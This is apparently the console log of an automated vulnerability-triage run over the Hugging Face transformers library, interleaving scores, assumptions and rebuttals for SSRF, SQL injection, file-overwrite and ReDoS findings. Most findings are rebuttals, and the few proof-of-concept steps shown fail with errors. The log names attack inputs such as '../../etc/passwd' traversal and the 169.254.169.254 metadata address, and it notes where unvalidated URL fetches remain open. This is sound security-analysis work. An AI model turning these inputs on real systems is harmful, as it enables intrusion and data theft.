+3. **Call chain is fragmented and logically disjoint.** The nine call chain 
+entries jump between unrelated functions in different modules (quantization, 
+video processing, tokenization, etc.) without a coherent path from untrusted 
+input to the alleged sink. Many of these functions are internal utilities not 
+directly exposed to the web endpoint.
+
+4. **No validation or bypass demonstration.** The finding does not show how an 
+attacker would inject a path like `/etc/passwd` or a traversal sequence. The 
+sink is a dictionary lookup, not a file open or join — even if the dictionary 
+contained paths, the code would need to actually use them in a filesystem 
+operation for LFI to occur.
+
+Because the core evidence (data flow, sink operation, and exploitability) is 
+missing or contradictory, the finding is not authentically exploitable. It 
+should be rebutted as a false positive.
+    Evidence: lfi-080...
+    ? 9/10 — interesting
+    Assumptions: ssrf-082...
+    x rebutted
+      reason: The finding is not authentically exploitable. The simulated web 
+endpoint (`@app.post(\"/api/v1/trigger\")`) is a synthetic wrapper added only 
+for security analysis—it is not part of the actual library. The library's 
+`__init__` functions (e.g., in tokenization classes) do not accept arbitrary 
+user-controlled strings in the manner required to reach `save_vocabulary`. The 
+data flow trace is incomplete: the call chain jumps through unrelated functions 
+(jinja2 compilation, model conversion, etc.) without demonstrating that 
+untrusted input propagates to `self.monolingual_vocab_file`. In real usage, 
+`monolingual_vocab_file` is set from a model path or pretrained resource, not 
+from direct attacker input. The static analyzer failed to trace variable 
+propagation and relies on an assumed bridge that is not substantiated. 
+Therefore, the reported path traversal risk does not materialize in any 
+practical deployment.
+    Evidence: lfi-079...
+    ? pattern matched (3 match(es))
+  [85/207] ssrf-084 (get_artifacts_links)
+    ? pattern matched (4 match(es))
+  [86/207] ssrf-085 (get_daily_ci_runs)
+    ? pattern matched (3 match(es))
+  [87/207] ssrf-086 (get_last_daily_ci_run)
+    ? 10/10 — interesting
+    Assumptions: ssrf-083...
+    ✓ 2/10 - safe
+    Assumptions: ssrf-084...
+    ? 8/10 — interesting
+    Assumptions: ssrf-086...
+      3 assumptions (3 violable)
+    Evidence: ssrf-082...
+      2 assumptions (2 violable)
+    Evidence: ssrf-083...
+    ✓ 1/10 - safe
+    Assumptions: ssrf-085...
+    ? pattern matched (4 match(es))
+  [88/207] ssrf-087 (get_last_stable_minor_release)
+    ? pattern matched (4 match(es))
+  [89/207] ssrf-088 (check_file_exists_on_github)
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: ssrf-084...
+    x rebutted
+      reason: The claimed SSRF vulnerability is not exploitable. The 
+`get_artifacts_links` function constructs a URL with a fixed base 
+(`https://api.github.com/...`) and the attacker-controlled `workflow_run_id` 
+parameter is inserted only into the path segment. Since the host is hardcoded to
+`api.github.com`, there is no way for an attacker to redirect the HTTP request 
+to an internal or arbitrary host. Even if the value contains special characters 
+or path traversals, the request will still be sent to `api.github.com`. The 
+attacker cannot control the host or port, making SSRF to private IPs or cloud 
+metadata endpoints impossible. The simulated wrapper (`@app.post(...)`) is not 
+part of the original library and does not represent a real attack surface in the
+codebase as used.
+    Evidence: ssrf-084...
+    ✓ 1/10 - safe
+    Assumptions: ssrf-087...
+    ? pattern matched (4 match(es))
+  [90/207] ssrf-089 (load_video)
+    ✓ 0/10 - safe
+    Assumptions: ssrf-088...
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: ssrf-085...
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: ssrf-086...
+    x rebutted
+      reason: The finding claims SSRF via user-controlled URLs passed to HTTP 
+clients, but the source code shows the request URL is hardcoded to 
+'https://api.github.com/repos/huggingface/transformers/actions/runs/{workflow_ru
+n_id}' (line ~45). The only user-controlled portion is the `workflow_run_id` 
+path segment, not the host or base URL. Since the host is fixed to 
+api.github.com, an attacker cannot redirect requests to internal IPs (e.g., 
+127.0.0.1, 169.254.169.254) because they do not control the server response. 
+Additionally, the `artifact_url` used in `download_artifact` originates from 
+GitHub API responses, not direct user input. No untrusted input reaches a 
+configurable HTTP endpoint. Therefore, SSRF exploitation is not feasible.
+    Evidence: ssrf-086...
+    x rebutted
+      reason: The reported SSRF vulnerability is not exploitable because all 
+HTTP requests in the library use hardcoded URLs pointing to `api.github.com`. 
+User-controlled input (passed via the simulated wrapper) does not influence the 
+host, port, or scheme of the requests. The only user-controllable parameters 
+(such as `workflow_id` or `workflow_run_id`) are inserted into the path of a 
+fixed GitHub API endpoint, which does not allow redirection to internal or 
+arbitrary hosts. The language-level redirect following concern is irrelevant 
+here because the initial target is GitHub's server, which is not 
+attacker-controlled and does not redirect to internal IPs. Therefore, no SSRF 
+attack is possible.
+    Evidence: ssrf-085...
+      6 assumptions (6 violable)
+    Evidence: ssrf-087...
+    ? pattern matched (3 match(es))
+  [91/207] ssrf-090 (spawn_conversion)
+    ? pattern matched (6 match(es))
+  [92/207] ssrf-091 (load_image_as_tensor)
+    ? pattern matched (3 match(es))
+  [93/207] ssrf-092 (_fetch_audio_bytes)
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: ssrf-088...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: ssrf-089...
+    x rebutted
+      reason: The SSRF finding is not exploitable because the attacker cannot 
+control the host or port of the HTTP request. The URL is constructed with a 
+fixed, trusted domain (`GITHUB_RAW_URL`) followed by a user-controlled path 
+segment. This only allows path manipulation within the same external domain, not
+arbitrary host redirection. Even if the HTTP client follows redirects by 
+default, the initial request goes to GitHub's servers; any redirect would 
+originate from GitHub, not an attacker. Path traversal (e.g., `../../../`) does 
+not change the host and only alters the path, which is not sufficient for SSRF. 
+Therefore, no internal network or metadata service can be reached. Code 
+evidence: line constructing URL `url = f"{GITHUB_RAW_URL}/{file_path}"` (line 
+~65 in the snippet).
+    Evidence: ssrf-088...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: ssrf-091...
+    ? pattern matched (3 match(es))
+  [94/207] ssrf-093 (define_sagemaker_information)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: ssrf-092...
+      3 assumptions (3 violable)
+    Adversary: ssrf-089...
+    not rebutted
+      weak point: The code directly passes user-controlled URL to httpx.get with
+no validation, making SSRF trivial. No input sanitization, no IP/host 
+allowlisting, and redirects are enabled, allowing bypasses.
+    PoC Agent: ssrf-089...
+  [95/207] ssrf-094 (prepare_config)
+Slice ssrf-089 failed: '"success"'
+    Error: ssrf-089: '"success"'
+    ? 6/10 — interesting
+    Assumptions: ssrf-090...
+      6 assumptions (6 violable)
+    Adversary: ssrf-091...
+      7 assumptions (7 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: ssrf-092...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: ssrf-094...
+    not rebutted
+      weak point: Lack of any host validation or redirect restriction makes SSRF
+straightforward. The function unconditionally fetches user-supplied URLs via 
+httpx with follow_redirects=True, and only checks the URL scheme. No allowlist, 
+IP blocklist, or redirect re-validation is present, allowing direct access to 
+internal services (e.g., cloud metadata, internal APIs) or exploit via 
+redirects.
+    PoC Agent: ssrf-091...
+  [96/207] ssrf-095 (forward)
+Slice ssrf-091 failed: '"success"'
+    Error: ssrf-091: '"success"'
+    not rebutted
+      weak point: The code directly uses user-controlled URL (from conversation 
+content) in httpx.get without any IP validation or redirect handling, making 
+SSRF exploitable.
+    PoC Agent: ssrf-092...
+  [97/207] ssrf-096 (_merge_input_ids_with_audio_features)
+Slice ssrf-092 failed: '"success"'
+    Error: ssrf-092: '"success"'
+      5 assumptions (5 violable)
+    Evidence: ssrf-090...
+    ? 9/10 — interesting
+    Assumptions: ssrf-093...
+    ✓ 0/10 - safe
+    Assumptions: ssrf-096...
+    ? pattern matched (4 match(es))
+  [98/207] ssrf-097 (forward)
+    ✓ 0/10 - safe
+    Assumptions: ssrf-095...
+      5 assumptions (5 violable)
+    Adversary: ssrf-094...
+    ? 10/10 — interesting
+    Assumptions: ssrf-097...
+      8 assumptions (8 violable)
+    Evidence: ssrf-093...
+    x rebutted
+      reason: The reported SSRF vulnerability is not exploitable in the actual 
+codebase. The `prepare_config` function is defined with a `size_config_url` 
+parameter, but the only callers shown in the source code are within 
+`convert_textnet_checkpoint` (lines 116–132 of the provided snippet), where the 
+URL is passed as hardcoded constants (`tiny_config_url`, `small_config_url`, 
+`base_config_url`). There is no evidence that user-controlled input can reach 
+this function. The finding’s “SYSTEM WRAPPER” simulating an API endpoint 
+(`@app.post("/api/v1/trigger")`) is a hypothetical scenario not present in the 
+actual library code. The code is a standalone conversion script, not a web 
+service exposed to untrusted users. Therefore, the data flow from attacker input
+to the sink (`httpx.get`) does not exist, and the vulnerability is not 
+actionable.
+    Evidence: ssrf-094...
+    ? pattern matched (4 match(es))
+  [99/207] ssrf-098 (forward)
+      3 assumptions (3 violable)
+    Evidence: ssrf-096...
+    ? pattern matched (5 match(es))
+  [100/207] ssrf-099 (forward)
+    ? pattern matched (4 match(es))
+  [101/207] ssrf-100 (forward)
+      4 assumptions (4 violable)
+    Evidence: ssrf-095...
+    ? pattern matched (2 match(es))
+  [102/207] ssrf-101 (fail_all_requests)
+    ? 10/10 — interesting
+    Assumptions: ssrf-099...
+    ? 10/10 — interesting
+    Assumptions: ssrf-100...
+    ? 10/10 — interesting
+    Assumptions: ssrf-098...
+      5 assumptions (5 violable)
+    Evidence: ssrf-097...
+    ? pattern matched (2 match(es))
+  [103/207] ssrf-102 (print_model_load)
+      7 assumptions (7 violable)
+    Evidence: ssrf-100...
+      5 assumptions (5 violable)
+    Evidence: ssrf-099...
+    ? pattern matched (2 match(es))
+  [104/207] sqli-103 (create_module_to_test_map)
+      6 assumptions (6 violable)
+    Evidence: ssrf-098...
+    ? pattern matched (2 match(es))
+  [105/207] sqli-104 (check_missing_backends)
+    ✓ 1/10 - safe
+    Assumptions: ssrf-101...
+    ? pattern matched (2 match(es))
+  [106/207] sqli-105 (find_executable_batch_size)
+    ? 10/10 — interesting
+    Assumptions: sqli-104...
+    ? 10/10 — interesting
+    Assumptions: sqli-103...
+    ✓ 2/10 - safe
+    Assumptions: ssrf-102...
+      3 assumptions (3 violable)
+    Evidence: ssrf-101...
+    ? pattern matched (3 match(es))
+  [107/207] sqli-106 (post_init)
+    ? 10/10 — interesting
+    Assumptions: sqli-105...
+      no assumptions extracted
+    Evidence: sqli-104...
+    ? pattern matched (1 match(es))
+  [108/207] sqli-107 (get_class_from_dynamic_module)
+      2 assumptions (2 violable)
+    Evidence: ssrf-102...
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-103...
+    x rebutted
+      reason: The finding claims SQL injection, but the provided source code 
+contains no database queries, no SQL string construction, and no interaction 
+with any SQL database. The code is entirely about file system operations 
+(building test maps, filtering file names, glob patterns). There is no SQL sink 
+to exploit. Therefore, the vulnerability is not exploitable. The analysis 
+incorrectly labels the vulnerability type; no SQL injection is possible.
+    Evidence: sqli-103...
+    ? pattern matched (1 match(es))
+  [109/207] sqli-108 (_raise_timeout_error)
+    ? pattern matched (3 match(es))
+  [110/207] sqli-109 (requires)
+      5 assumptions (5 violable)
+    Evidence: sqli-105...
+    ? 10/10 — interesting
+    Assumptions: sqli-106...
+    ? pattern matched (2 match(es))
+  [111/207] sqli-110 (_det_track_one_frame)
+    ? 10/10 — interesting
+    Assumptions: sqli-109...
+    ? 10/10 — interesting
+    Assumptions: sqli-108...
+    ? 10/10 — interesting
+    Assumptions: sqli-107...
+    ? 10/10 — interesting
+    Assumptions: sqli-110...
+      10 assumptions (10 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-106...
+    x rebutted
+      reason: The reported vulnerability is SQL injection, but the provided 
+source code contains no SQL queries, database interactions, or any use of 
+SQL-related APIs. All functions are part of the Hugging Face Transformers 
+library and deal with model initialization, quantization, checkpoint saving, and
+video processor serialization. There is no occurrence of SQL statement 
+construction, parameterized queries, or raw string interpolation in a database 
+context. The sink function `_save_checkpoint` only writes model checkpoints to 
+the filesystem, not to a database. No untrusted input reaches any SQL operation 
+because none exist. Therefore, the finding is not exploitable.
+    Evidence: sqli-106...
+    ? pattern matched (1 match(es))
+  [112/207] sqli-111 (from_pretrained)
+      no assumptions extracted
+    Evidence: sqli-108...
+      no assumptions extracted
+    Evidence: sqli-109...
+      7 assumptions (7 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-107...
+    ? pattern matched (2 match(es))
+  [113/207] sqli-112 (from_pretrained)
+    ? pattern matched (1 match(es))
+  [114/207] sqli-113 (from_pretrained)
+    x rebutted
+      reason: The reported SQL injection vulnerability is not present. The 
+provided source code is from the Hugging Face `transformers` library and 
+contains no SQL queries, database drivers, or string formatting for SQL 
+construction. All code paths deal with dynamic module loading, file I/O, 
+dictionary processing, model weight conversion, and training checkpoints. The 
+`get_class_from_dynamic_module` function loads Python modules from files, not 
+SQL. There is no `SELECT`, `INSERT`, `UPDATE`, `DELETE`, or any database API 
+call. The finding is based on a misclassification by the static analysis tool; 
+the 'F-string/format-based SQL queries' pattern does not appear anywhere in the 
+code. Therefore, the vulnerability is not exploitable.
+    Evidence: sqli-107...
+      5 assumptions (5 violable)
+    Evidence: sqli-110...
+    ? pattern matched (1 match(es))
+  [115/207] sqli-114 (from_pretrained)
+    ? 10/10 — interesting
+    Assumptions: sqli-111...
+    ? pattern matched (1 match(es))
+  [116/207] sqli-115 (from_pretrained)
+    ? 10/10 — interesting
+    Assumptions: sqli-112...
+    ? 10/10 — interesting
+    Assumptions: sqli-113...
+    ? 10/10 — interesting
+    Assumptions: sqli-115...
+    ? 10/10 — interesting
+    Assumptions: sqli-114...
+      4 assumptions (4 violable)
+    Evidence: sqli-112...
+    No code-level evidence patterns.
+  [117/207] sqli-116 (load_custom_generate)
+      5 assumptions (5 violable)
+    Evidence: sqli-113...
+    No code-level evidence patterns.
+  [118/207] sqli-117 (parse_args)
+      4 assumptions (4 violable)
+    Evidence: sqli-111...
+    No code-level evidence patterns.
+  [119/207] sqli-118 (parse_args)
+      5 assumptions (5 violable)
+    Evidence: sqli-114...
+    No code-level evidence patterns.
+  [120/207] sqli-119 (parse_args)
+      3 assumptions (3 violable)
+    Evidence: sqli-115...
+    No code-level evidence patterns.
+  [121/207] sqli-120 (parse_args)
+    ? 10/10 — interesting
+    Assumptions: sqli-117...
+    ? 10/10 — interesting
+    Assumptions: sqli-116...
+    ? 10/10 — interesting
+    Assumptions: sqli-118...
+      7 assumptions (7 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-116...
+    ? 10/10 — interesting
+    Assumptions: sqli-119...
+    ? 10/10 — interesting
+    Assumptions: sqli-120...
+    x rebutted
+      reason: The reported SQL injection vulnerability is not present in the 
+provided source code. The code consists entirely of Hugging Face Transformers 
+library functions for model loading, generation configuration, video processing,
+checkpointing, and file paths. There are no SQL queries, database connections, 
+or any database interaction whatsoever. The sink functions (e.g., 
+`execute_jit_checkpoint`) only perform file I/O and checkpoint management. No 
+string formatting or concatenation is used to build SQL statements; all 
+f-strings are used for error messages or file path construction. Therefore, the 
+finding is invalid and should be dismissed.
+    Evidence: sqli-116...
+    ? pattern matched (1 match(es))
+  [122/207] sqli-121 (parse_args)
+      no assumptions extracted
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-119...
+      no assumptions extracted
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-118...
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-117...
+    x rebutted
+      reason: The source code provided contains no SQL queries, database 
+connections, or any string formatting that could lead to SQL injection. All call
+chains involve argparse argument parsing, JSON schema generation, Jinja template
+rendering, tokenization, and quantization. The reported sink 
+`_process_model_before_weight_loading` (line 54 of quantizer_vptq.py) deals with
+replacing model layers, not SQL. None of the functions construct or execute SQL 
+statements. The finding's claim of 'F-string/format-based SQL queries' is 
+unsupported by any evidence in the code. Therefore, the vulnerability is not 
+present.
+    Evidence: sqli-119...
+    No code-level evidence patterns.
+  [123/207] sqli-122 (parse_args)
+    x rebutted
+      reason: The provided source code contains no SQL queries, database 
+interactions, or any SQL-related operations. All functions shown deal with 
+argument parsing, type hint conversion, chat template rendering, model weight 
+conversion, and quantization. There is no `sqlite3`, `psycopg2`, 
+`mysql-connector`, or any other database library usage. The 'SQLI' 
+classification appears to be a static analysis false positive triggered by a 
+pattern match, but no actual SQL injection sink exists. The data flow 
+annotations mention 'BridgeVerifier: pattern evidence' but not evidence of any 
+SQL code. Therefore, the finding is not exploitable.
+    Evidence: sqli-118...
+    No code-level evidence patterns.
+  [124/207] afo-123 (get_errors_from_single_artifact)
+    x rebutted
+      reason: The finding claims SQL Injection (SQLI), but the provided source 
+code contains no SQL queries, database connections, or any database interaction 
+at all. The code spans argument parsers, type-hint parsing, chat template 
+rendering, and model weight conversion – none of which involve SQL. Without an 
+SQL sink, SQL injection is categorically impossible. The finding is therefore 
+invalid.
+    Evidence: sqli-117...
+    No code-level evidence patterns.
+  [125/207] afo-124 (download_test_file)
+    ? 10/10 — interesting
+    Assumptions: sqli-121...
+    ? 10/10 — interesting
+    Assumptions: afo-123...
+      10 assumptions (10 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-120...
+    x rebutted
+      reason: The source code does not contain any SQL query construction, 
+database connections, or string formatting for SQL. All functions involve 
+argument parsing, JSON schema generation, Jinja template rendering, and model 
+conversion. There is no SQL injection vector. The finding is a false positive.
+    Evidence: sqli-120...
+    No code-level evidence patterns.
+  [126/207] afo-125 (download_and_extract)
+    ? 10/10 — interesting
+    Assumptions: sqli-122...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: afo-124...
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-122...
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: sqli-121...
+    x rebutted
+      reason: The source code contains no SQL queries, database interactions, or
+any SQL-related operations. All call chains shown involve argparse argument 
+parsing, JSON schema generation, Jinja template rendering, tokenizer chat 
+formatting, and model weight loading. The sink function 
+`_process_model_before_weight_loading` in `quantizer_vptq.py` deals with 
+replacing linear layers for quantization, not SQL. No f-strings or string 
+formatting constructs are used to build SQL statements. The vulnerability type 
+'SQLI' is completely unsupported by the provided code. There is no plausible 
+attack vector for SQL injection.
+    Evidence: sqli-122...
+    No code-level evidence patterns.
+  [127/207] afo-126 (convert_and_run_ruff)
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: afo-123...
+    x rebutted
+      reason: The provided source code contains no SQL query construction, no 
+database connections, and no string formatting used to build SQL statements. All
+code snippets relate to argument parsing, type hint conversion, Jinja template 
+rendering, tokenization, and model weight conversion. There is no SQL injection 
+sink or any path by which user input could be interpreted as SQL. The finding is
+therefore not exploitable.
+    Evidence: sqli-121...
+    No code-level evidence patterns.
+  [128/207] afo-127 (extract_nemotron_tokenizer)
+      6 assumptions (6 violable)
+    Adversary: afo-124...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: afo-125...
+    x rebutted
+      reason: The reported vulnerability (AFO) implies arbitrary file overwrite,
+but the sink function `get_errors_from_single_artifact` only reads from zip 
+entries via `zipfile.ZipFile.open`. There is no write operation (no `open(..., 
+'w')` or equivalent). Even if filenames inside the zip contain path traversal 
+sequences like `../`, the `zipfile` module's `open()` method accesses entries 
+within the archive, not the filesystem. No arbitrary file write or overwrite is 
+possible. Additionally, the input parameter `artifact_zip_path` is used as a 
+path to a zip file; an attacker could only read existing zip files, and the 
+function's output is limited to parsed error lines, not raw file contents. 
+Therefore, the finding is not exploitable.
+    Evidence: afo-123...
+    No code-level evidence patterns.
+  [129/207] afo-128 (fetch_test_set)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: afo-126...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: afo-127...
+    x rebutted
+      reason: The finding claims that an attacker can achieve arbitrary file 
+overwrite by supplying a URL without forward slashes (e.g., `../../etc/passwd`),
+causing the entire string to become the filename while the HTTP response content
+is written to that path. However, this is not exploitable because the `url` 
+parameter is used both as the HTTP request target and to derive the local 
+filename. For the HTTP request (`httpx.stream("GET", url, ...)`) to succeed and 
+return attacker-controlled content, the `url` must be a valid HTTP URL with a 
+scheme (e.g., `http://...`). Any valid HTTP URL necessarily contains at least 
+one forward slash (the `://` separator), so `url.split('/')[-1]` will always 
+return only the last path component — never a string like `../../etc/passwd`. If
+the attacker supplies a bare path without a scheme (e.g., `../../etc/passwd`), 
+the HTTP request will fail with an exception (invalid URL). In that case, 
+`open(filename, 'wb')` does create/truncate the file, but the except block 
+immediately removes it (`os.remove(filename)`), so no persistent overwrite 
+occurs. The attacker cannot simultaneously control the filename to traverse 
+directories and have the HTTP request succeed with arbitrary content. Therefore,
+the path traversal attack described is not achievable.
+    Evidence: afo-124...
+    ? 9/10 — interesting
+    Assumptions: afo-128...
+    ? pattern matched (3 match(es))
+  [130/207] afo-129 (download_and_unzip)
+      6 assumptions (6 violable)
+    Adversary: afo-127...
+      4 assumptions (4 violable)
+    Adversary: afo-126...
+      8 assumptions (8 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: afo-125...
+    not rebutted
+      weak point: The attacker controls both the archive contents and the 
+config, making path traversal straight-forward. The code lacks any validation.
+    PoC Agent: afo-127...
+  [131/207] redos-130 (_extract_reason_from_decorators)
+Slice afo-127 failed: '"success"'
+    Error: afo-127: '"success"'
+    x rebutted
+      reason: The finding claims arbitrary file overwrite via 
+`zipfile.extractall` in `download_and_extract`. However, the call chains 
+provided are from internal development scripts or library utility functions not 
+exposed to external untrusted input. The simulated web wrapper is hypothetical 
+and not part of the actual application. No realistic attack scenario exists 
+where an attacker can control the `task` or `data_dir` parameters of 
+`download_and_extract` (Call Chain [0]) or the command-line arguments of 
+`scan_skipped_tests.py` (Call Chain [1]) from a remote context. Therefore, the 
+vulnerability is not exploitable in practice.
+    Evidence: afo-125...
+    not rebutted
+      weak point: The vulnerability is real: no path validation on 
+`modular_file_path` allows directory traversal. However, the temporary file is 
+created, written, then deleted in quick succession, limiting the window for 
+persistent overwrite. Exploitation requires either a race condition (e.g., 
+another process reads before deletion) or triggering an error that skips the 
+`os.remove()` call. Additionally, the attacker must be able to supply a 
+malicious `modular_file_path`; in a library context, this depends on the 
+deployment (e.g., if the function is exposed via a web endpoint or CLI that 
+accepts user-supplied paths). The finding is not fully disproven but has 
+practical constraints that reduce confidence slightly.
+    PoC Agent: afo-126...
+  [132/207] redos-131 (extract_test_info)
+Slice afo-126 failed: '"success"'
+    Error: afo-126: '"success"'
+      3 assumptions (3 violable)
+    Evidence: afo-128...
+    ? pattern matched (4 match(es))
+  [133/207] redos-132 (_normalize)
+    ? 6/10 — interesting
+    Assumptions: afo-129...
+    ? pattern matched (1 match(es))
+  [134/207] redos-133 (_strip_source_for_tokens)
+    ? 10/10 — interesting
+    Assumptions: redos-130...
+    ? 10/10 — interesting
+    Assumptions: redos-132...
+      6 assumptions (6 violable)
+    Evidence: afo-129...
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: redos-131...
+    ? pattern matched (1 match(es))
+  [135/207] redos-134 (_tokenize)
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: redos-132...
+      2 assumptions (1 violable)
+    path bridge: 2 builder + 2 consumer
+    Adversary: redos-130...
+    x rebutted
+      reason: The reported ReDoS vulnerability is not exploitable. The 
+`_normalize` function uses a fixed regex pattern `[^a-z0-9]+` (line 149) which 
+is a simple character class with a single plus quantifier. This pattern does not
+contain nested quantifiers, overlapping alternations, or greedy wildcards near 
+boundaries—the documented conditions for catastrophic backtracking. The regex 
+evaluation complexity is strictly O(n) relative to input length. Although the 
+input is attacker-controlled (via the simulated web endpoint), the pattern 
+itself is not user-supplied, and the fixed pattern is inherently safe. No other 
+regex in the provided code paths introduces a vulnerable pattern. Therefore, the
+finding is invalid.
+    Evidence: redos-132...
+      3 assumptions (3 violable)
+    path bridge: 2 builder + 2 consumer
+    Adversary: redos-131...
+    ? pattern matched (1 match(es))
+  [136/207] redos-135 (_leading_symbol_prefix)
+    x rebutted
+      reason: The finding claims a ReDoS vulnerability caused by 
+attacker-controlled regex patterns. However, the regex patterns in the code are 
+all hardcoded literals (lines 52, 53, 66). The only data that reaches these 
+regexes is the content of test files read from disk (line 82: `file_content = 
+file_path.read_text(...)`). These files are part of the source repository, not 
+supplied by an attacker. The entry point `main` (line 161) is a CLI tool that 
+only accepts `--output_dir` and `--test_method_name`, neither of which 
+influences the file content or the regex patterns. There is no routing of 
+untrusted network input to the regex sink. The simulated web endpoint in the 
+annotations is not part of the actual library; it is a hypothetical wrapper 
+added for analysis purposes. Therefore, even if the regex patterns had 
+catastrophic backtracking potential, an attacker cannot control the input to 
+trigger it. The vulnerability is not exploitable.
+    Evidence: redos-130...
+    ? 9/10 — interesting
+    Assumptions: redos-133...
+    x rebutted
+      reason: The reported ReDoS vulnerability is not exploitable in the actual 
+code. The regex pattern `((?:^\s*@.*?\n)*?)^\s*def\s+(test_[A-Za-z0-9_]+)\b` is 
+hardcoded and applied to `file_content` from local filesystem reads 
+(`model_test_files`). The attacker does not control the file content; the input 
+originates from a directory of model test files, not from external user input. 
+The hypothetical web endpoint in the system wrapper is not part of the real 
+application—the actual entry point is a CLI script with `argparse` that only 
+accepts `--output_dir` and `--test_method_name`, neither of which feeds 
+untrusted data into `extract_test_info`. Additionally, the regex uses lazy 
+quantifiers (`*?`) which significantly reduce the risk of catastrophic 
+backtracking. Even if an attacker could write to the filesystem, the regex 
+complexity is linear with respect to input length. Therefore, the finding is not
+practically exploitable.
+    Evidence: redos-131...
+    ? pattern matched (3 match(es))
+  [137/207] redos-136 (_sanitize_for_embedding)
+    ? 9/10 — interesting
+    Assumptions: redos-134...
+    ? pattern matched (1 match(es))
+  [138/207] redos-137 (extract_first_line_failure)
+    ? 10/10 — interesting
+    Assumptions: redos-135...
+      no assumptions extracted
+    path bridge: 1 builder + 3 consumer
+    Adversary: redos-133...
+    ? 10/10 — interesting
+    Assumptions: redos-136...
+    ? 10/10 — interesting
+    Assumptions: redos-137...
+    x rebutted
+      reason: The finding claims a ReDoS vulnerability from "attacker-controlled
+regex patterns", but the regex in question is hardcoded and applied to source 
+files read from a local directory (`self.models_root`). The simulated API 
+wrapper is not part of the actual library — the real code is a CLI utility 
+(scan_skipped_tests.py) that processes pre-existing Python files. An attacker 
+would need **write access** to the models directory to inject a malicious file, 
+which is a local privilege not representative of a remote/network attack. 
+Moreover, the regex pattern `("""|\'\'\')(?:.|\n)*?\1` is not a classic nested 
+quantifier ReDoS; while it may exhibit polynomial backtracking on crafted input,
+the input size is bounded by typical Python source files and the tool is not 
+exposed to arbitrary user input. Therefore the vulnerability is not 
+authentically exploitable in any realistic deployment scenario.
+    Evidence: redos-133...
+      4 assumptions (4 violable)
+    Evidence: redos-134...
+    ? pattern matched (6 match(es))
+  [139/207] redos-138 (clean_code)
+    ? pattern matched (1 match(es))
+  [140/207] redos-139 (keep_doc_examples_only)
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: redos-135...
+      1 assumptions (1 violable)
+    Evidence: redos-137...
+    x rebutted
+      reason: The reported ReDoS vulnerability is not exploitable. The two regex
+patterns in `_leading_symbol_prefix` are:
+- `r"^([A-Z][a-z0-9]+)"`
+- `r"^([A-Za-z0-9]+)"`
+
+Neither pattern contains nested quantifiers (e.g., `(a+)+`), overlapping 
+alternations (e.g., `(a|a)+`), or any other construct known to cause 
+catastrophic backtracking. The first pattern is a linear sequence of one 
+uppercase letter followed by one or more lowercase letters/digits. The second is
+a single character class repeated one or more times. Both are anchored at the 
+start (`^`) and match deterministically in O(n) time against the input. Even if 
+an attacker could supply an arbitrarily long input (which is unlikely because 
+the input `name` originates from Python AST class/function names in the parsed 
+files), the regex engine would not exhibit exponential backtracking. Therefore, 
+no ReDoS condition exists.
+    Evidence: redos-135...
+    ? pattern matched (1 match(es))
+  [141/207] redos-140 (extract_imports)
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: redos-136...
+    ? pattern matched (4 match(es))
+  [142/207] redos-141 (parse_commit_message)
+    x rebutted
+      reason: The regex pattern used in `_sanitize_for_embedding` is 
+`re.escape(variant)`, which escapes all regex metacharacters, resulting in a 
+literal string pattern. This pattern does not contain nested quantifiers, 
+overlapping alternations, or greedy wildcards that could cause catastrophic 
+backtracking. The evaluation complexity is strictly O(n) relative to the input 
+length. Therefore, no ReDoS vulnerability exists. The finding's assertion about 
+nested quantifiers is incorrect because the attacker-controlled input is escaped
+and used as a literal string.
+    Evidence: redos-136...
+    ? 10/10 — interesting
+    Assumptions: redos-139...
+    ? 10/10 — interesting
+    Assumptions: redos-141...
+    ? pattern matched (3 match(es))
+  [143/207] redos-142 (get_new_model)
+    ? 10/10 — interesting
+    Assumptions: redos-138...
+    ? 10/10 — interesting
+    Assumptions: redos-142...
+    ? 9/10 — interesting
+    Assumptions: redos-140...
+      1 assumptions (1 violable)
+    Evidence: redos-141...
+      2 assumptions (1 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: redos-139...
+    ? pattern matched (1 match(es))
+  [144/207] redos-143 (sort_auto_mapping)
+    x rebutted
+      reason: The finding claims a ReDoS vulnerability due to user-supplied or 
+attacker-controlled regex patterns with nested quantifiers. However, the only 
+regex in the code is `re.sub("#.*$", "", line)` (line 33), which is a static, 
+hardcoded pattern. This pattern is linear (`#` followed by `.*` and end-of-line 
+anchor) and contains no nested quantifiers (e.g., `(a+)+`) or overlapping 
+alternations. Even if an attacker could control the `content` input to 
+`keep_doc_examples_only`, the regex itself is not vulnerable to catastrophic 
+backtracking. Moreover, the data flow originates from file contents read from a 
+local git repository (`diff_contains_doc_examples`), not from untrusted user 
